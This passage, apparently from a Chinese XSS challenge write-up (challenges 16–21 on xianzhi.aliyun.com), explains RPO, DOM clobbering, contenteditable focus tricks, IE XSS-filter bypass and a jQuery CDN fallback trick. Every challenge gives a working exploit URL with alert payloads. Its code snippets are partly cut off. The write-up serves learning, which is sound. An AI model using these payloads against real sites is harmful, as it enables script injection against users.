什么又是DOM Clobbering，在 **IE8** 下，`abc.def`将会是123
那么题目中的`self.location`也就可以通过这样的方式去覆盖值.
IE exp:  
当然还是需要注意调节兼容性，关于兼容性，可以看第八题的writeup  
更多关于DOM Clobbering的文章:  
ref:   
### 16\. PHP_SELF
    ",">",$output);
    echo $output;
    ?>
一个比较明显的RPO漏洞，但是国内对这方面介绍比较少
这个文档对RPO讲的比较清楚
总结起来就是因为php_self的存在，下面这个css会根据链接情况来加载
当我访问`xianzhi.aliyun.com/xss16.php`的时候，web相对路径就是`/`，这时候加载的css就是`xianzhi.aliyun.com/styles.css`
但是当我访问`xianzhi.aliyun.com/xss16.php/%7B%7D*%7Bbackground-color:%20red%7D*%7B%7D/`，也就是`{}*{background-color:
red}*{}`，web的相对路径就是`/xss16.php/%7B%7D*%7Bbackground-color:%20red%7D*%7B%7D/`，这时候加载的css内容是`http://xianzhi.aliyun.com/xss16.php/%7B%7D*%7Bbackground-color:%20red%7D*%7B%7D/styles.css`
css的解析并没有像html那么严格，所以你可以看到网页将会被渲染为红色。
高潮部分来了，现在想办法就是利用css去加载js  
可以利用sct文件，但是缺陷就是sct必须要是在同域下.
可以发现题目还有一个xss.png....内容如下
IE exp:
    http://xianzhi.aliyun.com/xss16.php/{}*{behavior:url(http://xianzhi.aliyun.com/xss.png)}*{}/
当然css触发xss的，还可以用`expression`
ref: 
### 17\. passive element
    ";
    ?>
输出点在div里面，这种被动元素如何去触发xss？
html5sec总结：  
所以可以被动一点，需要用户点击一下之类操作去触发xss
IE exp:
    http://xianzhi.aliyun.com/xss17.php?content=a%27%20style=%27-webkit-user-modify:read-write%27%20onfocus=%27alert(1)%27%20id=%27xss
但是M师傅提供了一个比较通用而且无需用户交互的poc
除FF以外的浏览器 exp:
    http://xianzhi.aliyun.com/xss17.php?content=%27onfocus=%27alert(1)%27%20contenteditable%20tabindex=%270%27%20id=%27xss#xss
ref: 
### 18\. Graduate
    ","",$_GET["input"]);
    //Fix#002
    $input=str_replace("/","\/",$input);
    echo $input;
    ?>
也是炒鸡好的题目，输入点在`textarea`里面，在不能闭合的情况下搞事情
有一个细节就是，开启了xss保护  
在IE下，这个保护是他会把认为有害的字符过滤掉
IE exp:
    http://xianzhi.aliyun.com/xss18.php?input=%3Ctextarea%3E%3Cimg%20src=1%20on%3Cscript%3Eerror=alert(document.domain)%3E
ref: 
### 19\. Party(未做出)
    function getCookie(cname) {
        var name = cname + "=";
        var decodedCookie = decodeURIComponent(document.cookie);
        var ca = decodedCookie.split(';');
        for(var i = 0; i 
    ';?>
FF exp:
    http://xianzhi.aliyun.com/xss19.php?link=data:image%2fsvg%2bxml,%3Cmeta%20xmlns=%27http://www.w3.org/1999/xhtml%27%20http-equiv=%27Set-Cookie%27%20content=%27username=%25%32%35%33%43script%25%32%35%33%65alert%25%32%35%32%381%25%32%35%32%39%25%32%35%33%43%25%32%35%32%66script%25%32%35%33%65%27%20/%3E
ref: 
### 20\. The End(未做出)
    hookid='';
IE exp
    http://xianzhi.aliyun.com/xss20.php?hookid='%2b{valueOf:location, toString:[].join,0:'javascript:alert%25281%2529',length:1}%2b'
ref: 
另外膜一下一血大佬用safari的0day做出来了.
### 21\. 番外番 jquery
    window.jQuery || document.write('');
juqery高版本不适合一些低版本的浏览器，或者意外因素(中国网络环境)，cdn的jqeury可能会加载失败，这时候就需要加载一下本地的jquery，本地加载的jquery版本为`1.6.1`是存在漏洞
但是网络环境不可控，为了稳定的让受害者加载带有漏洞的jquery，那么一定要**让cdn的jquery加载失败**～
只要请求远程cdn时有某个header，比如说referrer，超出了cdn服务器所能接受的范围，就会产生拒绝请求的现象，比如很长串的字符.
chrome Exp:
    http://xianzhi.aliyun.com/xss21.php?a=a....(中间省略9000个a)#
另外就是踩的一些坑
    FF测试不成功，应该它对location.hash的操作，比如操作不会成功，因为网页是已经加载好了
ref: 